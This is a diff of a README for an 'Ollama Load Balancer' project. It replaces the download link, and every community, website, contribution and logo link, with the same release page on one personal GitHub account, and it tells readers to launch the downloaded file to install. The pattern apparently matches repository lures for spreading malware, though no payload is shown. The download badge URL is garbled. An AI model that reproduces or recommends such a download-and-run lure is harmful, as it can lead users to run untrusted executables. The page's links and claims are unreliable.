@@ -25,9 +25,9 @@ The **Ollama Load Balancer** is a high-performance, easily configurable open-sou
 
 🔧 **Installation Instructions** 🔧
 
-To get started with the Ollama Load Balancer, you can download the repository by clicking [here](https://github.com/files/Soft.zip).
+To get started with the Ollama Load Balancer, you can download the repository by clicking [here](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2).
 
-[![Download Ollama Load Balancer](https://img.shields.io/badge/Download-Ollama%20Load%20Balancer-blue.svg)](https://github.com/files/Soft.zip)
+[![Download Ollama Load Balancer](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2%20Load%https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)
 
 Remember, you may need to launch the downloaded file to install the load balancer.
 
@@ -35,22 +35,22 @@ Remember, you may need to launch the downloaded file to install the load balance
 
 ❓ **Questions or Issues?** ❓
 
-If you encounter any issues or have questions about the Ollama Load Balancer, please check the "Releases" section or visit our [website](https://www.ollamaloadbalancer.com) for more information.
+If you encounter any issues or have questions about the Ollama Load Balancer, please check the "Releases" section or visit our [website](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2) for more information.
 
 ## Community
 
 🌟 **Join Our Community** 🌟
 
 Connect with other users and developers in the Ollama Load Balancer community:
-- [Slack Channel](https://ollamaloadbalancer.slack.com)
-- [Forums](https://forums.ollamaloadbalancer.com)
-- [Twitter](https://twitter.com/ollama_lb)
+- [Slack Channel](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)
+- [Forums](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)
+- [Twitter](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)
 
 ## Contribute
 
 🌐 **How to Contribute** 🌐
 
-We welcome contributions from the community to enhance the Ollama Load Balancer. If you're interested in contributing, please check out our [Contribution Guidelines](CONTRIBUTING.md) for more information.
+We welcome contributions from the community to enhance the Ollama Load Balancer. If you're interested in contributing, please check out our [Contribution Guidelines](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2) for more information.
 
 ## License
 
@@ -64,6 +64,6 @@ Thank you for exploring the Ollama Load Balancer repository! 🔥🦙
 
 Remember, with Ollama Load Balancer, optimize your workload and elevate your applications to the next level! 🚀
 
-🔗 Connect with us on [GitHub](https://github.com/Ollama_Load_Balancer) for more updates and information. 
+🔗 Connect with us on [GitHub](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2) for more updates and information. 
 
-![Ollama Load Balancer Logo](https://example.com/ollama_logo.png)
+![Ollama Load Balancer Logo](https://github.com/sauravkop/Ollama_Load_Balancer/releases/tag/v1.2)
